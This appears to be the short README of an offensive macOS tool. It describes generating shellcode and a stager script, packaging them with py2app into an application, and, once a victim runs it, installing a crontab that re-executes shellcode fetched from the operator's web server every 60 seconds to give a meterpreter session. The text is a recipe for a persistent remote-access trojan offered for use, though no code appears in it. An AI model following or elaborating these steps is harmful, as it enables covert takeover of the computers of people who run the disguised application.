this requires py2app and OSX, essentially you just run the provision.sh script to generate shellcode and the stager.py script, then create the application with python setup.py py2app

when someone runs the application, a crontab will be installed to run every 60 seconds that checks to see if python is running and if its not, it execs the shellcode on your webserver to give you a meterpreter session
